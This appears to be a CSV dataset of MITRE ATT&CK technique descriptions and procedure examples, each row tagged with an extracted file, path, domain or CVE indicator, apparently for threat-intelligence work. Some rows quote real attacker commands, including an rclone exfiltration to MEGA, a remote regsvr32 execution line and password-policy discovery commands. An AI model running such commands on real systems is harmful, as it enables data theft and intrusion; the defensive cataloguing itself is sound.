T1574.009,Path Interception by Unquoted Path,"Adversaries may execute their own malicious payloads by hijacking vulnerable file path references. Adversaries can take advantage of paths that lack surrounding quotations by placing an executable in a higher level directory within the path, so that Windows will choose the adversary's executable to launch.   Service paths    [1]    and shortcut paths may also be vulnerable to path interception if the path has one or more spaces and is not surrounded by quotation marks (e.g.,  C:\unsafe path with space\program.exe  vs.  ""C:\safe path with space\program.exe"" ).    [2]    (stored in Windows Registry keys) An adversary can place an executable in a higher level directory of the path, and Windows will resolve that executable instead of the intended executable. For example, if the path in a shortcut is  C:\program files\myapp.exe , an adversary may create a program at  C:\program.exe  that will be run instead of the intended program.    [3]       [4]      This technique can be used for persistence if executables are called on a regular basis, as well as privilege escalation if intercepted executables are started by a higher privileged process.",Description,path,C:\unsafe path with space\program.exe
T1574.009,Path Interception by Unquoted Path,"Adversaries may execute their own malicious payloads by hijacking vulnerable file path references. Adversaries can take advantage of paths that lack surrounding quotations by placing an executable in a higher level directory within the path, so that Windows will choose the adversary's executable to launch.   Service paths    [1]    and shortcut paths may also be vulnerable to path interception if the path has one or more spaces and is not surrounded by quotation marks (e.g.,  C:\unsafe path with space\program.exe  vs.  ""C:\safe path with space\program.exe"" ).    [2]    (stored in Windows Registry keys) An adversary can place an executable in a higher level directory of the path, and Windows will resolve that executable instead of the intended executable. For example, if the path in a shortcut is  C:\program files\myapp.exe , an adversary may create a program at  C:\program.exe  that will be run instead of the intended program.    [3]       [4]      This technique can be used for persistence if executables are called on a regular basis, as well as privilege escalation if intercepted executables are started by a higher privileged process.",Description,path,C:\safe path with space\program.exe
T1574.009,Path Interception by Unquoted Path,"Adversaries may execute their own malicious payloads by hijacking vulnerable file path references. Adversaries can take advantage of paths that lack surrounding quotations by placing an executable in a higher level directory within the path, so that Windows will choose the adversary's executable to launch.   Service paths    [1]    and shortcut paths may also be vulnerable to path interception if the path has one or more spaces and is not surrounded by quotation marks (e.g.,  C:\unsafe path with space\program.exe  vs.  ""C:\safe path with space\program.exe"" ).    [2]    (stored in Windows Registry keys) An adversary can place an executable in a higher level directory of the path, and Windows will resolve that executable instead of the intended executable. For example, if the path in a shortcut is  C:\program files\myapp.exe , an adversary may create a program at  C:\program.exe  that will be run instead of the intended program.    [3]       [4]      This technique can be used for persistence if executables are called on a regular basis, as well as privilege escalation if intercepted executables are started by a higher privileged process.",Description,path,C:\program.exe
T1574.009,Path Interception by Unquoted Path,"Adversaries may execute their own malicious payloads by hijacking vulnerable file path references. Adversaries can take advantage of paths that lack surrounding quotations by placing an executable in a higher level directory within the path, so that Windows will choose the adversary's executable to launch.   Service paths    [1]    and shortcut paths may also be vulnerable to path interception if the path has one or more spaces and is not surrounded by quotation marks (e.g.,  C:\unsafe path with space\program.exe  vs.  ""C:\safe path with space\program.exe"" ).    [2]    (stored in Windows Registry keys) An adversary can place an executable in a higher level directory of the path, and Windows will resolve that executable instead of the intended executable. For example, if the path in a shortcut is  C:\program files\myapp.exe , an adversary may create a program at  C:\program.exe  that will be run instead of the intended program.    [3]       [4]      This technique can be used for persistence if executables are called on a regular basis, as well as privilege escalation if intercepted executables are started by a higher privileged process.",Description,file,program.exe
T1574.009,Path Interception by Unquoted Path,"Adversaries may execute their own malicious payloads by hijacking vulnerable file path references. Adversaries can take advantage of paths that lack surrounding quotations by placing an executable in a higher level directory within the path, so that Windows will choose the adversary's executable to launch.   Service paths    [1]    and shortcut paths may also be vulnerable to path interception if the path has one or more spaces and is not surrounded by quotation marks (e.g.,  C:\unsafe path with space\program.exe  vs.  ""C:\safe path with space\program.exe"" ).    [2]    (stored in Windows Registry keys) An adversary can place an executable in a higher level directory of the path, and Windows will resolve that executable instead of the intended executable. For example, if the path in a shortcut is  C:\program files\myapp.exe , an adversary may create a program at  C:\program.exe  that will be run instead of the intended program.    [3]       [4]      This technique can be used for persistence if executables are called on a regular basis, as well as privilege escalation if intercepted executables are started by a higher privileged process.",Description,file,myapp.exe
T1574.009,Path Interception by Unquoted Path,"Adversaries may execute their own malicious payloads by hijacking vulnerable file path references. Adversaries can take advantage of paths that lack surrounding quotations by placing an executable in a higher level directory within the path, so that Windows will choose the adversary's executable to launch.   Service paths    [1]    and shortcut paths may also be vulnerable to path interception if the path has one or more spaces and is not surrounded by quotation marks (e.g.,  C:\unsafe path with space\program.exe  vs.  ""C:\safe path with space\program.exe"" ).    [2]    (stored in Windows Registry keys) An adversary can place an executable in a higher level directory of the path, and Windows will resolve that executable instead of the intended executable. For example, if the path in a shortcut is  C:\program files\myapp.exe , an adversary may create a program at  C:\program.exe  that will be run instead of the intended program.    [3]       [4]      This technique can be used for persistence if executables are called on a regular basis, as well as privilege escalation if intercepted executables are started by a higher privileged process.",Description,path,C:\unsafe
T1574.009,Path Interception by Unquoted Path,"Adversaries may execute their own malicious payloads by hijacking vulnerable file path references. Adversaries can take advantage of paths that lack surrounding quotations by placing an executable in a higher level directory within the path, so that Windows will choose the adversary's executable to launch.   Service paths    [1]    and shortcut paths may also be vulnerable to path interception if the path has one or more spaces and is not surrounded by quotation marks (e.g.,  C:\unsafe path with space\program.exe  vs.  ""C:\safe path with space\program.exe"" ).    [2]    (stored in Windows Registry keys) An adversary can place an executable in a higher level directory of the path, and Windows will resolve that executable instead of the intended executable. For example, if the path in a shortcut is  C:\program files\myapp.exe , an adversary may create a program at  C:\program.exe  that will be run instead of the intended program.    [3]       [4]      This technique can be used for persistence if executables are called on a regular basis, as well as privilege escalation if intercepted executables are started by a higher privileged process.",Description,path,C:\safe
T1574.009,Path Interception by Unquoted Path,"Adversaries may execute their own malicious payloads by hijacking vulnerable file path references. Adversaries can take advantage of paths that lack surrounding quotations by placing an executable in a higher level directory within the path, so that Windows will choose the adversary's executable to launch.   Service paths    [1]    and shortcut paths may also be vulnerable to path interception if the path has one or more spaces and is not surrounded by quotation marks (e.g.,  C:\unsafe path with space\program.exe  vs.  ""C:\safe path with space\program.exe"" ).    [2]    (stored in Windows Registry keys) An adversary can place an executable in a higher level directory of the path, and Windows will resolve that executable instead of the intended executable. For example, if the path in a shortcut is  C:\program files\myapp.exe , an adversary may create a program at  C:\program.exe  that will be run instead of the intended program.    [3]       [4]      This technique can be used for persistence if executables are called on a regular basis, as well as privilege escalation if intercepted executables are started by a higher privileged process.",Description,path,C:\program
T1574.001,DLL Search Order Hijacking,"BOOSTWRITE  has exploited the loading of the legitimate Dwrite.dll file by actually loading the gdi library, which then loads the gdiplus library and ultimately loads the local Dwrite dll.   [13]",Procedure Examples,file,Dwrite.dll
T1574.001,DLL Search Order Hijacking,Downdelph  uses search order hijacking of the Windows executable sysprep.exe to escalate privileges.   [16],Procedure Examples,file,sysprep.exe
T1574.001,DLL Search Order Hijacking,FoggyWeb 's loader has used DLL Search Order Hijacking to load malicious code instead of the legitimate  version.dll  during the  Microsoft.IdentityServer.ServiceHost.exe  execution process.   [21],Procedure Examples,file,version.dll
T1574.001,DLL Search Order Hijacking,FoggyWeb 's loader has used DLL Search Order Hijacking to load malicious code instead of the legitimate  version.dll  during the  Microsoft.IdentityServer.ServiceHost.exe  execution process.   [21],Procedure Examples,file,Microsoft.IdentityServer.ServiceHost.exe
T1574.001,DLL Search Order Hijacking,Hikit  has used  DLL Search Order Hijacking  to load  oci.dll  as a persistence mechanism.   [22],Procedure Examples,file,oci.dll
T1574.001,DLL Search Order Hijacking,"HTTPBrowser  abuses the Windows DLL load order by using a legitimate Symantec anti-virus binary, VPDN_LU.exe, to load a malicious DLL that mimics a legitimate Symantec DLL, navlu.dll.   [23]",Procedure Examples,file,VPDN_LU.exe
T1574.001,DLL Search Order Hijacking,"HTTPBrowser  abuses the Windows DLL load order by using a legitimate Symantec anti-virus binary, VPDN_LU.exe, to load a malicious DLL that mimics a legitimate Symantec DLL, navlu.dll.   [23]",Procedure Examples,file,navlu.dll
T1574.001,DLL Search Order Hijacking,InvisiMole  can be launched by using DLL search order hijacking in which the wrapper DLL is placed in the same folder as explorer.exe and loaded during startup into the Windows Explorer process instead of the legitimate library.   [24],Procedure Examples,file,explorer.exe
T1574.001,DLL Search Order Hijacking,Prikormka  uses DLL search order hijacking for persistence by saving itself as ntshrui.dll to the Windows directory so it will load before the legitimate ntshrui.dll saved in the System32 subdirectory.   [30],Procedure Examples,file,ntshrui.dll
T1574.001,DLL Search Order Hijacking,"Variants of  WEBC2  achieve persistence by using DLL search order hijacking, usually by copying the DLL file to  %SYSTEMROOT%  ( C:\WINDOWS\ntshrui.dll ).   [37]",Procedure Examples,path,C:\WINDOWS\ntshrui.dll
T1574.001,DLL Search Order Hijacking,"Variants of  WEBC2  achieve persistence by using DLL search order hijacking, usually by copying the DLL file to  %SYSTEMROOT%  ( C:\WINDOWS\ntshrui.dll ).   [37]",Procedure Examples,file,ntshrui.dll
T1070.007,Clear Network Connection History and Configurations,"Adversaries may clear or remove evidence of malicious network connections in order to clean up traces of their operations. Configuration settings as well as various artifacts that highlight connection history may be created on a system from behaviors that require network connections, such as  Remote Services  or  External Remote Services . Defenders may use these artifacts to monitor or otherwise analyze network connections created by adversaries.   Network connection history may be stored in various locations on a system. For example, RDP connection history may be stored in Windows Registry values under    [1]   :   Windows may also store information about recent RDP connections in files such as  C:\Users\%username%\Documents\Default.rdp  and  C:\Users\%username%\AppData\Local\Microsoft\TerminalServer Client\Cache\ .   [2]    Similarly, macOS and Linux hosts may store information highlighting connection history in system logs (such as those stored in  /Library/Logs  and/or  /var/log/ ).   [3]      [4]      [5]      Malicious network connections may also require changes to network configuration settings, such as  Disable or Modify System Firewall  or tampering to enable  Proxy . Adversaries may delete or modify this data to conceal indicators and/or impede defensive analysis.",Description,path,C:\Users\%username%\Documents\Default.rdp
T1070.007,Clear Network Connection History and Configurations,"Adversaries may clear or remove evidence of malicious network connections in order to clean up traces of their operations. Configuration settings as well as various artifacts that highlight connection history may be created on a system from behaviors that require network connections, such as  Remote Services  or  External Remote Services . Defenders may use these artifacts to monitor or otherwise analyze network connections created by adversaries.   Network connection history may be stored in various locations on a system. For example, RDP connection history may be stored in Windows Registry values under    [1]   :   Windows may also store information about recent RDP connections in files such as  C:\Users\%username%\Documents\Default.rdp  and  C:\Users\%username%\AppData\Local\Microsoft\TerminalServer Client\Cache\ .   [2]    Similarly, macOS and Linux hosts may store information highlighting connection history in system logs (such as those stored in  /Library/Logs  and/or  /var/log/ ).   [3]      [4]      [5]      Malicious network connections may also require changes to network configuration settings, such as  Disable or Modify System Firewall  or tampering to enable  Proxy . Adversaries may delete or modify this data to conceal indicators and/or impede defensive analysis.",Description,path,C:\Users
T1047,Windows Management Instrumentation,Avaddon  uses wmic.exe to delete shadow copies.   [13],Procedure Examples,file,wmic.exe
T1047,Windows Management Instrumentation,Blue Mockingbird  has used wmic.exe to set environment variables.   [17],Procedure Examples,file,wmic.exe
T1047,Windows Management Instrumentation,Emotet  has used WMI to execute powershell.exe.   [34],Procedure Examples,file,powershell.exe
T1047,Windows Management Instrumentation,FIN8 's malicious spearphishing payloads use WMI to launch malware and spawn cmd.exe execution.  FIN8  has also used WMIC for lateral movement as well as during and post compromise cleanup activities.   [41]      [42]      [43],Procedure Examples,file,cmd.exe
T1047,Windows Management Instrumentation,HermeticWizard  can use WMI to create a new process on a remote machine via  C:\windows\system32\cmd.exe /c start C:\windows\system32\\regsvr32.exe /s /iC:\windows\&lt;filename&gt;.dll .   [52],Procedure Examples,path,/s /iC:\windows\&lt;filename&gt;.dll
T1047,Windows Management Instrumentation,HermeticWizard  can use WMI to create a new process on a remote machine via  C:\windows\system32\cmd.exe /c start C:\windows\system32\\regsvr32.exe /s /iC:\windows\&lt;filename&gt;.dll .   [52],Procedure Examples,path,C:\windows\system32\cmd.exe
T1047,Windows Management Instrumentation,HermeticWizard  can use WMI to create a new process on a remote machine via  C:\windows\system32\cmd.exe /c start C:\windows\system32\\regsvr32.exe /s /iC:\windows\&lt;filename&gt;.dll .   [52],Procedure Examples,path,/c start C:\windows\system32\\regsvr32.exe
T1047,Windows Management Instrumentation,HermeticWizard  can use WMI to create a new process on a remote machine via  C:\windows\system32\cmd.exe /c start C:\windows\system32\\regsvr32.exe /s /iC:\windows\&lt;filename&gt;.dll .   [52],Procedure Examples,file,cmd.exe
T1047,Windows Management Instrumentation,HermeticWizard  can use WMI to create a new process on a remote machine via  C:\windows\system32\cmd.exe /c start C:\windows\system32\\regsvr32.exe /s /iC:\windows\&lt;filename&gt;.dll .   [52],Procedure Examples,file,regsvr32.exe
T1047,Windows Management Instrumentation,HermeticWizard  can use WMI to create a new process on a remote machine via  C:\windows\system32\cmd.exe /c start C:\windows\system32\\regsvr32.exe /s /iC:\windows\&lt;filename&gt;.dll .   [52],Procedure Examples,path,C:\windows\system32\\regsvr32.exe
T1047,Windows Management Instrumentation,Meteor  can use  wmic.exe  as part of its effort to delete shadow copies.   [74],Procedure Examples,file,wmic.exe
T1047,Windows Management Instrumentation,Naikon  has used WMIC.exe for lateral movement.   [85],Procedure Examples,file,WMIC.exe
T1047,Windows Management Instrumentation,Octopus  has used wmic.exe for local discovery information.   [89],Procedure Examples,file,wmic.exe
T1047,Windows Management Instrumentation,Remexi  executes received commands with wmic.exe (for WMI commands).    [104],Procedure Examples,file,wmic.exe
T1047,Windows Management Instrumentation,Stuxnet  used WMI with an  explorer.exe  token to execute on a remote share.   [115],Procedure Examples,file,explorer.exe
T1057,Process Discovery,An  APT28  loader Trojan will enumerate the victim's processes searching for explorer.exe if its current process does not have necessary permissions.   [7],Procedure Examples,file,explorer.exe
T1057,Process Discovery,FoggyWeb 's loader can enumerate all Common Language Runtimes (CLRs) and running Application Domains in the compromised AD FS server's  Microsoft.IdentityServer.ServiceHost.exe  process.   [103],Procedure Examples,file,Microsoft.IdentityServer.ServiceHost.exe
T1057,Process Discovery,"FunnyDream  has the ability to discover processes, including  Bka.exe  and  BkavUtil.exe .   [106]",Procedure Examples,file,Bka.exe
T1057,Process Discovery,"FunnyDream  has the ability to discover processes, including  Bka.exe  and  BkavUtil.exe .   [106]",Procedure Examples,file,BkavUtil.exe
T1057,Process Discovery,"Meteor  can check if a specific process is running, such as Kaspersky's  avp.exe .   [166]",Procedure Examples,file,avp.exe
T1057,Process Discovery,njRAT  can search a list of running processes for Tr.exe.   [176],Procedure Examples,file,Tr.exe
T1057,Process Discovery,"During  Operation Honeybee , the threat actors obtained a list of running processes on a victim machine using  cmd /c tasklist &gt; %temp%\temp.ini .   [181]",Procedure Examples,path,/c tasklist &gt; %temp%\temp.ini
T1057,Process Discovery,Saint Bot  has enumerated running processes on a compromised host to determine if it is running under the process name  dfrgui.exe .   [184],Procedure Examples,file,dfrgui.exe
T1057,Process Discovery,StrongPity  can determine if a user is logged in by checking to see if explorer.exe is running.   [231],Procedure Examples,file,explorer.exe
T1057,Process Discovery,SUNSPOT  monitored running processes for instances of  MsBuild.exe  by hashing the name of each running process and comparing it to the corresponding value  0x53D525 . It also extracted command-line arguments and individual arguments from the running  MsBuild.exe  process to identify the directory path of the Orion software Visual Studio solution.   [233],Procedure Examples,file,MsBuild.exe
T1057,Process Discovery,Winnti for Windows  can check if the explorer.exe process is responsible for calling its install function.   [261],Procedure Examples,file,explorer.exe
T1567.002,Exfiltration to Cloud Storage,"During  C0015 , the threat actors exfiltrated files and sensitive data to the MEGA cloud storage site using the  Rclone  command  rclone.exe copy --max-age 2y ""\\SERVER\Shares"" Mega:DATA -q --ignore-existing --auto-confirm --multi-thread-streams 7 --transfers 7 --bwlimit 10M .   [3]",Procedure Examples,file,rclone.exe
T1218,System Binary Proxy Execution,Lazarus Group  lnk files used for persistence have abused the Windows Update Client ( wuauclt.exe ) to execute a malicious DLL.   [4]      [5],Procedure Examples,file,wuauclt.exe
T1560,Archive Collected Data,"XCSSET  will compress entire  ~/Desktop  folders excluding all  .git  folders, but only if the total data size is under 200MB.   [50]",Procedure Examples,path,~/Desktop  folders excluding all  .git
T1566.002,Spearphishing Link,Turla  attempted to trick targets into clicking on a link featuring a seemingly legitimate domain from Adobe.com to download their malware and gain initial access.   [103],Procedure Examples,domain,adobe.com
T1074.001,Local Data Staging,"During  C0015 , PowerView's file share enumeration results were stored in the file  c:\ProgramData\found_shares.txt .   [15]",Procedure Examples,path,c:\ProgramData\found_shares.txt
T1074.001,Local Data Staging,Crutch  has staged stolen files in the  C:\AMD\Temp  directory.   [23],Procedure Examples,path,C:\AMD\Temp
T1074.001,Local Data Staging,FrameworkPOS  can identifiy payment card track data on the victim and copy it to a local file in a subdirectory of C:\Windows.   [35],Procedure Examples,path,C:\Windows
T1074.001,Local Data Staging,Kimsuky  has staged collected data files under  C:\Program Files\Common Files\System\Ole DB\ .   [44]      [45],Procedure Examples,path,C:\Program
T1074.001,Local Data Staging,Leviathan  has used C:\Windows\Debug and C:\Perflogs as staging directories.   [48]      [49],Procedure Examples,path,C:\Windows\Debug
T1074.001,Local Data Staging,Leviathan  has used C:\Windows\Debug and C:\Perflogs as staging directories.   [48]      [49],Procedure Examples,path,C:\Perflogs
T1074.001,Local Data Staging,"LightNeuron  can store email data in files and directories specified in its configuration, such as  C:\Windows\ServiceProfiles\NetworkService\appdata\Local\Temp\ .   [50]",Procedure Examples,path,C:\Windows\ServiceProfiles\NetworkService\appdata\Local\Temp
T1074.001,Local Data Staging,PowerLess  can stage stolen browser data in  C:\\Windows\\Temp\\cup.tmp  and keylogger data in  C:\\Windows\\Temp\\Report.06E17A5A-7325-4325-8E5D-E172EBA7FC5BK .   [73],Procedure Examples,path,C:\\Windows\\Temp\\cup.tmp
T1074.001,Local Data Staging,PowerLess  can stage stolen browser data in  C:\\Windows\\Temp\\cup.tmp  and keylogger data in  C:\\Windows\\Temp\\Report.06E17A5A-7325-4325-8E5D-E172EBA7FC5BK .   [73],Procedure Examples,path,C:\\Windows\\Temp\\Report.06E17A5A-7325-4325-8E5D-E172EBA7FC5BK
T1074.001,Local Data Staging,Pteranodon  creates various subdirectories under  %Temp%\reports\%  and copies files to those subdirectories. It also creates a folder at  C:\Users\ \AppData\Roaming\Microsoft\store   to store screenshot JPEG files.   [75],Procedure Examples,path,C:\Users
T1074.001,Local Data Staging,RainyDay  can use a file exfiltration tool to copy files to  C:\ProgramData\Adobe\temp  prior to exfiltration.   [79],Procedure Examples,path,C:\ProgramData\Adobe\temp
T1074.001,Local Data Staging,Rover  copies files from removable drives to  C:\system .   [83],Procedure Examples,path,C:\system
T1201,Password Policy Discovery,"Adversaries may attempt to access detailed information about the password policy used within an enterprise network or cloud environment. Password policies are a way to enforce complex passwords that are difficult to guess or crack through  Brute Force . This information may help the adversary to create a list of common passwords and launch dictionary and/or brute force attacks which adheres to the policy (e.g. if the minimum password length should be 8, then not trying passwords such as 'pass123'; not checking for more than 3-4 passwords per account if the lockout is set to 6 as to not lock out accounts).   Password policies can be set and discovered on Windows, Linux, and macOS systems via various command shell utilities such as  net accounts (/domain) ,  Get-ADDefaultDomainPasswordPolicy ,  chage -l    ,  cat /etc/pam.d/common-password , and  pwpolicy getaccountpolicies     [1]       [2]   . Adversaries may also leverage a  Network Device CLI  on network devices to discover password policy information (e.g.  show aaa ,  show aaa common-criteria policy all ).   [3]      Password policies can be discovered in cloud environments using available APIs such as  GetAccountPasswordPolicy  in AWS    [4]   .",Description,path,"/domain) ,  Get-ADDefaultDomainPasswordPolicy ,  chage -l    ,  cat /etc/pam.d"
T1201,Password Policy Discovery,OilRig  has used net.exe in a script with  net accounts /domain  to find the password policy of a domain.   [10],Procedure Examples,file,net.exe
T1189,Drive-by Compromise,APT19  performed a watering hole attack on forbes.com in 2014 to compromise targets.   [5],Procedure Examples,domain,forbes.com
T1189,Drive-by Compromise,"During  Operation Dust Storm , the threat actors used a watering hole attack on a popular software reseller to exploit the then-zero-day Internet Explorer vulnerability CVE-2014-0322.   [38]",Procedure Examples,cve,CVE-2014-0322
T1189,Drive-by Compromise,"RTM  has distributed its malware via the RIG and SUNDOWN exploit kits, as well as online advertising network  Yandex.Direct .   [47]      [48]",Procedure Examples,domain,yandex.direct
T1564.004,NTFS File Attributes,"If the victim is using PowerShell 3.0 or later,  POWERSOURCE  writes its decoded payload to an alternate data stream (ADS) named kernel32.dll that is saved in  %PROGRAMDATA%\Windows\ .   [16]",Procedure Examples,file,kernel32.dll
T1137.001,Office Template Macros,"Adversaries may abuse Microsoft Office templates to obtain persistence on a compromised system. Microsoft Office contains templates that are part of common Office applications and are used to customize styles. The base templates within the application are used each time an application starts.    [1]      Office Visual Basic for Applications (VBA) macros    [2]    can be inserted into the base template and used to execute code when the respective Office application starts in order to obtain persistence. Examples for both Word and Excel have been discovered and published. By default, Word has a Normal.dotm template created that can be modified to include a malicious macro. Excel does not have a template file created by default, but one can be added that will automatically be loaded.   [3]      [4]    Shared templates may also be stored and pulled from remote locations.   [5]       Word Normal.dotm location:  C:\Users\&lt;username&gt;\AppData\Roaming\Microsoft\Templates\Normal.dotm    Excel Personal.xlsb location:  C:\Users\&lt;username&gt;\AppData\Roaming\Microsoft\Excel\XLSTART\PERSONAL.XLSB    Adversaries may also change the location of the base template to point to their own by hijacking the application's search order, e.g. Word 2016 will first look for Normal.dotm under  C:\Program Files (x86)\Microsoft Office\root\Office16\ , or by modifying the GlobalDotName registry key. By modifying the GlobalDotName registry key an adversary can specify an arbitrary location, file name, and file extension to use for the template that will be loaded on application startup. To abuse GlobalDotName, adversaries may first need to register the template as a trusted document or place it in a trusted location.   [5]       An adversary may need to enable macros to execute unrestricted depending on the system or enterprise security policy on use of macros.",Description,path,C:\Users\&lt;username&gt;\AppData\Roaming\Microsoft\Excel\XLSTART\PERSONAL.XLSB
T1137.001,Office Template Macros,"Adversaries may abuse Microsoft Office templates to obtain persistence on a compromised system. Microsoft Office contains templates that are part of common Office applications and are used to customize styles. The base templates within the application are used each time an application starts.    [1]      Office Visual Basic for Applications (VBA) macros    [2]    can be inserted into the base template and used to execute code when the respective Office application starts in order to obtain persistence. Examples for both Word and Excel have been discovered and published. By default, Word has a Normal.dotm template created that can be modified to include a malicious macro. Excel does not have a template file created by default, but one can be added that will automatically be loaded.   [3]      [4]    Shared templates may also be stored and pulled from remote locations.   [5]       Word Normal.dotm location:  C:\Users\&lt;username&gt;\AppData\Roaming\Microsoft\Templates\Normal.dotm    Excel Personal.xlsb location:  C:\Users\&lt;username&gt;\AppData\Roaming\Microsoft\Excel\XLSTART\PERSONAL.XLSB    Adversaries may also change the location of the base template to point to their own by hijacking the application's search order, e.g. Word 2016 will first look for Normal.dotm under  C:\Program Files (x86)\Microsoft Office\root\Office16\ , or by modifying the GlobalDotName registry key. By modifying the GlobalDotName registry key an adversary can specify an arbitrary location, file name, and file extension to use for the template that will be loaded on application startup. To abuse GlobalDotName, adversaries may first need to register the template as a trusted document or place it in a trusted location.   [5]       An adversary may need to enable macros to execute unrestricted depending on the system or enterprise security policy on use of macros.",Description,path,C:\Users\&lt;username&gt;\AppData\Roaming\Microsoft\Templates\Normal.dotm
T1137.001,Office Template Macros,"Adversaries may abuse Microsoft Office templates to obtain persistence on a compromised system. Microsoft Office contains templates that are part of common Office applications and are used to customize styles. The base templates within the application are used each time an application starts.    [1]      Office Visual Basic for Applications (VBA) macros    [2]    can be inserted into the base template and used to execute code when the respective Office application starts in order to obtain persistence. Examples for both Word and Excel have been discovered and published. By default, Word has a Normal.dotm template created that can be modified to include a malicious macro. Excel does not have a template file created by default, but one can be added that will automatically be loaded.   [3]      [4]    Shared templates may also be stored and pulled from remote locations.   [5]       Word Normal.dotm location:  C:\Users\&lt;username&gt;\AppData\Roaming\Microsoft\Templates\Normal.dotm    Excel Personal.xlsb location:  C:\Users\&lt;username&gt;\AppData\Roaming\Microsoft\Excel\XLSTART\PERSONAL.XLSB    Adversaries may also change the location of the base template to point to their own by hijacking the application's search order, e.g. Word 2016 will first look for Normal.dotm under  C:\Program Files (x86)\Microsoft Office\root\Office16\ , or by modifying the GlobalDotName registry key. By modifying the GlobalDotName registry key an adversary can specify an arbitrary location, file name, and file extension to use for the template that will be loaded on application startup. To abuse GlobalDotName, adversaries may first need to register the template as a trusted document or place it in a trusted location.   [5]       An adversary may need to enable macros to execute unrestricted depending on the system or enterprise security policy on use of macros.",Description,path,C:\Users
T1137.001,Office Template Macros,"Adversaries may abuse Microsoft Office templates to obtain persistence on a compromised system. Microsoft Office contains templates that are part of common Office applications and are used to customize styles. The base templates within the application are used each time an application starts.    [1]      Office Visual Basic for Applications (VBA) macros    [2]    can be inserted into the base template and used to execute code when the respective Office application starts in order to obtain persistence. Examples for both Word and Excel have been discovered and published. By default, Word has a Normal.dotm template created that can be modified to include a malicious macro. Excel does not have a template file created by default, but one can be added that will automatically be loaded.   [3]      [4]    Shared templates may also be stored and pulled from remote locations.   [5]       Word Normal.dotm location:  C:\Users\&lt;username&gt;\AppData\Roaming\Microsoft\Templates\Normal.dotm    Excel Personal.xlsb location:  C:\Users\&lt;username&gt;\AppData\Roaming\Microsoft\Excel\XLSTART\PERSONAL.XLSB    Adversaries may also change the location of the base template to point to their own by hijacking the application's search order, e.g. Word 2016 will first look for Normal.dotm under  C:\Program Files (x86)\Microsoft Office\root\Office16\ , or by modifying the GlobalDotName registry key. By modifying the GlobalDotName registry key an adversary can specify an arbitrary location, file name, and file extension to use for the template that will be loaded on application startup. To abuse GlobalDotName, adversaries may first need to register the template as a trusted document or place it in a trusted location.   [5]       An adversary may need to enable macros to execute unrestricted depending on the system or enterprise security policy on use of macros.",Description,path,C:\Program
T1056.001,Keylogging,"OwaAuth  captures and DES-encrypts credentials before writing the username and password to a log file,  C:\log.txt .   [79]",Procedure Examples,path,C:\log.txt
T1056.001,Keylogging,PoetRAT  has used a Python tool named klog.exe for keylogging.   [131],Procedure Examples,file,klog.exe
T1218.010,Regsvr32,"Adversaries may abuse Regsvr32.exe to proxy execution of malicious code. Regsvr32.exe is a command-line program used to register and unregister object linking and embedding controls, including dynamic link libraries (DLLs), on Windows systems. The Regsvr32.exe binary may also be signed by Microsoft.    [1]      Malicious usage of Regsvr32.exe may avoid triggering security tools that may not monitor execution of, and modules loaded by, the regsvr32.exe process because of allowlists or false positives from Windows using regsvr32.exe for normal operations. Regsvr32.exe can also be used to specifically bypass application control using functionality to load COM scriptlets to execute DLLs under user permissions. Since Regsvr32.exe is network and proxy aware, the scripts can be loaded by passing a uniform resource locator (URL) to file on an external Web server as an argument during invocation. This method makes no changes to the Registry as the COM object is not actually registered, only executed.    [2]    This variation of the technique is often referred to as a ""Squiblydoo"" and has been used in campaigns targeting governments.    [3]       [4]      Regsvr32.exe can also be leveraged to register a COM Object used to establish persistence via  Component Object Model Hijacking .    [3]",Description,file,Regsvr32.exe
T1218.010,Regsvr32,"Adversaries may abuse Regsvr32.exe to proxy execution of malicious code. Regsvr32.exe is a command-line program used to register and unregister object linking and embedding controls, including dynamic link libraries (DLLs), on Windows systems. The Regsvr32.exe binary may also be signed by Microsoft.    [1]      Malicious usage of Regsvr32.exe may avoid triggering security tools that may not monitor execution of, and modules loaded by, the regsvr32.exe process because of allowlists or false positives from Windows using regsvr32.exe for normal operations. Regsvr32.exe can also be used to specifically bypass application control using functionality to load COM scriptlets to execute DLLs under user permissions. Since Regsvr32.exe is network and proxy aware, the scripts can be loaded by passing a uniform resource locator (URL) to file on an external Web server as an argument during invocation. This method makes no changes to the Registry as the COM object is not actually registered, only executed.    [2]    This variation of the technique is often referred to as a ""Squiblydoo"" and has been used in campaigns targeting governments.    [3]       [4]      Regsvr32.exe can also be leveraged to register a COM Object used to establish persistence via  Component Object Model Hijacking .    [3]",Description,file,regsvr32.exe
T1218.010,Regsvr32,AppleSeed  can call regsvr32.exe for execution.   [5],Procedure Examples,file,regsvr32.exe
T1218.010,Regsvr32,APT32  created a  Scheduled Task/Job  that used regsvr32.exe to execute a COM scriptlet that dynamically downloaded a backdoor and injected it into memory. The group has also used regsvr32 to run their backdoor.   [7]      [8]      [9],Procedure Examples,file,regsvr32.exe
T1218.010,Regsvr32,Astaroth  can be loaded through regsvr32.exe.   [10],Procedure Examples,file,regsvr32.exe
T1218.010,Regsvr32,Blue Mockingbird  has executed custom-compiled XMRIG miner DLLs using regsvr32.exe.   [11],Procedure Examples,file,regsvr32.exe
T1218.010,Regsvr32,Cobalt Group  has used regsvr32.exe to execute scripts.   [13]      [14]      [15],Procedure Examples,file,regsvr32.exe
T1218.010,Regsvr32,Deep Panda  has used regsvr32.exe to execute a server variant of  Derusbi  in victim networks.   [16],Procedure Examples,file,regsvr32.exe
T1218.010,Regsvr32,Derusbi  variants have been seen that use Registry persistence to proxy execution through regsvr32.exe.   [17],Procedure Examples,file,regsvr32.exe
T1218.010,Regsvr32,Egregor  has used regsvr32.exe to execute malicious DLLs.   [18],Procedure Examples,file,regsvr32.exe
T1218.010,Regsvr32,EVILNUM  can run a remote scriptlet that drops a file and executes it via regsvr32.exe.   [19],Procedure Examples,file,regsvr32.exe
T1218.010,Regsvr32,HermeticWizard  has used  regsvr32.exe /s /i  to execute malicious payloads.   [20],Procedure Examples,file,regsvr32.exe
T1218.010,Regsvr32,Hi-Zor  executes using regsvr32.exe called from the  Registry Run Keys / Startup Folder  persistence mechanism.   [21],Procedure Examples,file,regsvr32.exe
T1218.010,Regsvr32,Inception  has ensured persistence at system boot by setting the value  regsvr32 %path%\ctfmonrn.dll /s .   [22],Procedure Examples,file,ctfmonrn.dll
T1218.010,Regsvr32,More_eggs  has used regsvr32.exe to execute the malicious DLL.   [27],Procedure Examples,file,regsvr32.exe
T1218.010,Regsvr32,Mori  can use  regsvr32.exe  for DLL execution.   [28],Procedure Examples,file,regsvr32.exe
T1218.010,Regsvr32,Ragnar Locker  has used regsvr32.exe to execute components of VirtualBox.   [32],Procedure Examples,file,regsvr32.exe
